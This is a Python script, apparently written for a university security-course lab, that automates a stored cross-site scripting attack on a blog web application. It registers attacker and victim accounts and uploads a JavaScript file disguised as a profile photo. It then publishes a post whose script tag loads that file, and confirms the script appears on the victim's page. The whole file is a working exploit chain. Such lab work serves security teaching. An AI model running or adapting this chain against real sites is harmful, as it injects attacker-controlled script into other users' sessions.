import random
import requests as req

def xssvuln12():
    #### ESTABLISH 2 SESSION OBJECTS, ONE FOR ATTACKER AND ONE FOR THE USER THAT WILL BE ATTACKED
    SERVER = "http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt"
    session = req.session()
    newsession = req.session()

    #### REGISTER A RANDOM USER THAT WILL ATTACK
    user = str(random.randint(2 ** 27, 2 ** 28))
    password = str(random.randint(2 ** 27, 2 ** 28))

    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/register', data=params)

    #### REGISTER A RANDOM USER THAT WILL BE ATTACKED
    victimuser = str(random.randint(2 ** 27, 2**28))
    victimpassword = str(random.randint(2**27, 2**28))

    victimparams = {'password': victimpassword, 'username':victimuser}
    newr =  newsession.post(SERVER + '/register', data=victimparams)

    #### LOGIN WITH THE ATTACKER
    params = {'password': password, 'username': user}
    r = session.post(SERVER + '/login', data=params, cookies=session.cookies)


    #### MAKE THE MULTIPART-FORM POST REQUEST AND INJECT PAYLOAD BY UPLOADING A JAVASCRIPT INSTEAD OF AN IMAGE
    payload = "xssvuln12"
    multipart_form_data = {'username': (None, user), 'name': (None, 'pwned'), 'currentpassword': (None, password),
                           'newpassword': (None, password), 'about': (None, payload),
                           'photo': ('xssvuln12.js', open('xssvuln12.js', 'rb'))}
    r = session.post(SERVER + '/update_profile', files=multipart_form_data, cookies=session.cookies)

    print(r.text)
    print(r.headers)

    #### MAKE A BLOGPOST EXPLOITING THE STORED JAVASCRIPT ON THE SERVER
    starthtml = (r.text).index("./static")
    endhtml = (r.text).index("xssvuln12.js")
    imagepath = r.text[starthtml+2:endhtml+12]
    payload = "<script src=\"http://a40ff75cdce02380039a825884964b5e117af09561845c13679abcb87fe4.project.ssof.rnl.tecnico.ulisboa.pt/" + imagepath + "\"></script>"
    params = {'content': payload, 'type': "Public"}
    rep = session.post(SERVER + '/create_post', data=params, cookies=session.cookies)

    #### PROOF THAT THE VICTIM GETS AN ALERT BY ENTERING THE WEBSITE
    #### LOGIN WITH THE VICTIM AND ASSERT THE EXPLOIT IS IN THE RESPONSE
    victimparams = {'password': victimpassword, 'username': victimuser}
    newr = newsession.post(SERVER + '/login', data=victimparams, cookies=newsession.cookies)

    assert payload in newr.text
    print(newr.text)
    print("path to stored exploit: " + imagepath)




    print("attacker username: " + user)
    print("attacker password: " + password)
    print("victim username: " + victimuser)
    print("victim password: " + victimpassword)

xssvuln12()


